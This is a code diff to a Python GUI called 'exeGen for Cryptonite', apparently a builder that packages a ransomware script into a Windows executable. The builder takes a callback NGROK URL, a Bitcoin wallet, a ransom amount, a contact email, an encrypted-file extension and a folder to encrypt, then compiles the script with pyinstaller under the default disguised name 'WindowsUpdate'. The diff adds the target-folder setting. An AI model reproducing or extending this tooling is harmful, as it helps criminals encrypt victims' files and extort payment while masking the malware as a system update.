@@ -10,11 +10,8 @@ def selectfolder():
     if not folder:
         return
     else:
-        filesave.destroy()
         folder_frm.config(text = f"{folder}")
-    
-        restore_btn = tk.Button(master = window, image = image4, command = selectfolder, borderwidth = 0)
-        restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "n", columnspan = 2)
+        filesave.config(image=image4, command = selectfolder, borderwidth = 0)
 
 def generate():
 
@@ -41,6 +38,7 @@ def generate():
         text = text.replace("BTC_WALLET = \"\"", f"BTC_WALLET = \"{configDict['BTC_WALLET']}\"")
         text = text.replace("EMAIL = \"\"", f"EMAIL = \"{configDict['EMAIL']}\"")
         text = text.replace("EXT = \"\"", f"EXT = \".{configDict['EXT']}\"")
+        text = text.replace("os.walk('./testfolder')", f"os.walk('{folder}')")
     with open("Cryptonite.py", "w") as f:
         f.write(text)
     os.system(f"pyinstaller --onefile --clean --icon=\".\images\icon.ico\" Cryptonite.py --name {FILE}")
@@ -58,8 +56,8 @@ def generate():
 window = tk.Tk()
 window.config(bg="white")
 window.title("exeGen for Cryptonite")
-window.rowconfigure([0,1,2,3,4,5,6], minsize = 30, weight = 0)
-window.rowconfigure([8], minsize = 100, weight = 1)
+window.rowconfigure([0,1,2,3,4,5,6,7], minsize = 30, weight = 0)
+window.rowconfigure([9], minsize = 100, weight = 0)
 window.resizable(0,0)
 window.columnconfigure(0, minsize = 400, weight = 0)
 window.columnconfigure(1, minsize = 400, weight = 0)
@@ -83,50 +81,53 @@ title = tk.Label(master = window, image = image0, bg = "black")
 title.grid(row = 0, column = 0, columnspan = 2, pady = (20, 30), padx = 15)
 
 name = tk.Label(master = window, text = "NAME (for exe file): ", font = ("arial", 15), fg = "black", bg = "white")
-name.grid(row = 1, column = 0, sticky = "e", pady = 20, padx = 15)
+name.grid(row = 1, column = 0, sticky = "e", pady = 10, padx = 15)
 name_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-name_entry.grid(row = 1, column = 1, sticky = "w", pady = 20, padx = 15)
+name_entry.grid(row = 1, column = 1, sticky = "w", pady = 10, padx = 15)
 name_entry.insert("0", "WindowsUpdate")
 
+folder = tk.Label(master = window, text = "FOLDER TO ENCRYPT: ", font = ("arial", 15), fg = "black", bg = "white")
+folder.grid(row = 2, column = 0, sticky = "e", pady = 10, padx = 15)
+folder_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
+folder_entry.grid(row = 2, column = 1, sticky = "w", pady = 10, padx = 15)
+folder_entry.insert("0", "./testfolder")
+
 url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15), fg = "black", bg = "white")
-url.grid(row = 2, column = 0, sticky = "e", pady = 20, padx = 15)
+url.grid(row = 3, column = 0, sticky = "e", pady = 10, padx = 15)
 url_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-url_entry.grid(row = 2, column = 1, sticky = "w", pady = 20, padx = 15)
+url_entry.grid(row = 3, column = 1, sticky = "w", pady = 10, padx = 15)
 
 btcw = tk.Label(master = window, text = "BTC WALLET ADDRESS: ", font = ("arial", 15), fg = "black", bg = "white")
-btcw.grid(row = 3, column = 0, sticky = "e", pady = 20, padx = 15)
+btcw.grid(row = 4, column = 0, sticky = "e", pady = 10, padx = 15)
 btcw_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-btcw_entry.grid(row = 3, column = 1, sticky = "w", pady = 20, padx = 15)
+btcw_entry.grid(row = 4, column = 1, sticky = "w", pady = 10, padx = 15)
 
 btcm = tk.Label(master = window, text = "BTC AMOUNT: ", font = ("arial", 15), fg = "black", bg = "white")
-btcm.grid(row = 4, column = 0, sticky = "e", pady = 20, padx = 15)
+btcm.grid(row = 5, column = 0, sticky = "e", pady = 10, padx = 15)
 btcm_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-btcm_entry.grid(row = 4, column = 1, sticky = "w", pady = 20, padx = 15)
+btcm_entry.grid(row = 5, column = 1, sticky = "w", pady = 10, padx = 15)
 
 email = tk.Label(master = window, text = "EMAIL: ", font = ("arial", 15), fg = "black", bg = "white")
-email.grid(row = 5, column = 0, sticky = "e", pady = 20, padx = 15)
+email.grid(row = 6, column = 0, sticky = "e", pady = 10, padx = 15)
 email_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-email_entry.grid(row = 5, column = 1, sticky = "w", pady = 20, padx = 15)
+email_entry.grid(row = 6, column = 1, sticky = "w", pady = 10, padx = 15)
 
 ext = tk.Label(master = window, text = "EXTENSION: ", font = ("arial", 15), fg = "black", bg = "white")
-ext.grid(row = 6, column = 0, sticky = "e", pady = 20, padx = 15)
+ext.grid(row = 7, column = 0, sticky = "e", pady = 10, padx = 15)
 ext_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-ext_entry.grid(row = 6, column = 1, sticky = "w", pady = 20, padx = 15)
+ext_entry.grid(row = 7, column = 1, sticky = "w", pady = 5, padx = 15)
 ext_entry.insert("0", ".cryptn8")
 
-ext = tk.Label(master = window, text = "", font = ("arial", 15), bg = "white")
-ext.grid(row = 7, column = 0, sticky = "e", pady = 5, padx = 15)
-
 folder_frm = tk.Label(master = window, text = f"..Folder path will appear here..", font = ("arial", 12))
-folder_frm.grid(row = 8, column = 0, sticky = "s", columnspan = 2, padx = 10, pady = 20)
+folder_frm.grid(row = 9, column = 0, columnspan = 2)
 
 filesave = tk.Button(master = window, image = image3, command = selectfolder, borderwidth = 0)
-filesave.grid(row = 8, column = 0, columnspan = 2, pady = 20, sticky = "n")
+filesave.grid(row = 10, column = 0, columnspan = 2, pady = (0,20), sticky = "n")
 
 generate_btn = tk.Button(master = window, image = image1, command = generate, borderwidth = 0)
-generate_btn.grid(row = 9, column = 0, columnspan = 2, pady = (10, 30))
+generate_btn.grid(row = 11, column = 0, columnspan = 2, pady = (10, 30))
 
 info_label = tk.Label(window, text = "The generator will automatically close after the exe has been generated.", font=("arial", 12))
-info_label.grid(row = 10, column = 0, columnspan = 2, sticky = "se")
+info_label.grid(row = 12, column = 0, columnspan = 2, sticky = "se")
 
 window.mainloop()
